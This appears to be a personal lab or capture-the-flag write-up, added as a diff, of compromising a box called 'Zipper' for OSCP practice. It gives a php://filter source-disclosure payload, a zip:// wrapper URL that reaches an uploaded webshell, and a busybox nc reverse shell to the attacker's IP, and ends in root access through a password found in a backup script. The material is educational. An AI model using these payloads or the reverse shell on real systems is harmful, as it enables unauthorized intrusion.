@@ -1,0 +1,145 @@
+**Start 12:14 06-05-2025**
+
+---
+```
+Scope:
+192.168.145.229
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV zipper -sT -T5 --min-rate=5000 -Pn -vvvv -p-
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Zipper
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## 80/TCP - HTTP
+
+![](../../../assets/062fde56a96d71ab005bd37cbaa78b63.png)
+
+I tried to upload a webshell and see what happens:
+
+![](../../../assets/c9f0af77b0750402d219bdb338e007d8.png)
+
+![](../../../assets/c5b3459f551746bae25bc40374c55711.png)
+
+Let's boot up `burp` to see what's happening underneath.
+
+![](../../../assets/543243ed1b7df28b06b4ca3b36d75187.png)
+
+I don't see anything unusual happening to my request, however I notice the `/index.php?file=` parameter and instantly think to test it.
+
+### Source Code Disclosure
+
+I go on and start testing it:
+
+```
+php://filter/read=convert.base64-encode/resource=config
+```
+
+![](../../../assets/fd069793308ff174b009cae7313bcaf7.png)
+
+![](../../../assets/ca974dc48b9ae974d7b057a33b91aba1.png)
+
+We get a new endpoint called `/home.php`, let's check it's source code:
+
+![](../../../assets/19a40b29a09f11d353c9b2f84149084f.png)
+
+This gave a massive output, however the relevant part is found below:
+
+![](../../../assets/0756549fe9cbe68a8e4ed957bbee86c6.png)
+
+Judging from this script I deducted that the function would naturally be called `upload.php`:
+
+![](../../../assets/b20dc2bb33b400faa6190aba03e8377f.png)
+
+>[!success]
+>Not gonna lie, I was pleasantly surprised
+
+![](../../../assets/f003d8110bbfa15d3c6f14f1d8f568c8.png)
+
+>[!note]
+>So this points to a Zip Upload vulnerability. We can HIGHLY LIKELY exploit this using hte `zip://` PHP wrapper.
+
+Since we know the path of the upload, and we've verified the zip file name (because we downloaded it) we can now put together the URL to get to our webshell:
+
+```
+http://zipper/index.php?file=zip://uploads/upload_1746527079.zip%23webshell
+```
+
+![](../../../assets/f852fa61731aba42813f1da8e4abd4be.png)
+
+Hell yeah!
+
+# Foothold
+## Shell as www-data
+
+From here I booted up `penelope.py` (I am really trying to familiarize myself with it) and used my favourite linux reverse shell:
+
+```shell
+busybox nc 192.168.45.183 443 -e bash
+```
+
+![](../../../assets/c91c8253d0bfd81297dbaead32e031e6.png)
+
+And we got access!! EZ PZ
+
+![](../../../assets/0e6dadaae6b20be85a87bf0222e8d9ef.png)
+
+It appears there's no users here.
+
+![](../../../assets/fd35c1cd95d5ffb454480d2245879c63.png)
+
+`/etc/passwd` confirms this, so no `local.txt`?
+
+![](../../../assets/e37ce397061c46729987fb93c2dcec31.png)
+
+Sneaky bastards.
+
+### local.txt
+
+![](../../../assets/867a3d8413b06ceec492723ac004780e.png)
+
+# Privilege Escalation
+## Sometimes it's right in front of you
+
+As always I start from `/` with my manual enum. I quickly find a `backup.sh` file owned by *root*:
+
+![](../../../assets/7c7fc5aabf49f2a378a1c200f0bf1259.png)
+
+![](../../../assets/b1231a3fef3bd9c3b1c304080c217aee.png)
+
+![](../../../assets/71621ec7ff9bf57c9eaf4cb7af018d65.png)
+
+I then started checking how to exploit this but one thing really stuck with me, the bottom part literally mentioned:
+
+```
+WildCardsGoingWild
+```
+
+What could this mean? Could this be the password to *root*?
+
+![](../../../assets/cd3bf4c732acdaf7989f804deed5985f.png)
+
+Lol, sure is.
+
+### proof.txt
+
+![](../../../assets/41e6961d842c95c39586c6fdd754d200.png)
+
+---
+
+**Finished 13:14 06-05-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#zip #php_wrapper #SourceCodeDisclosure #enumeration 
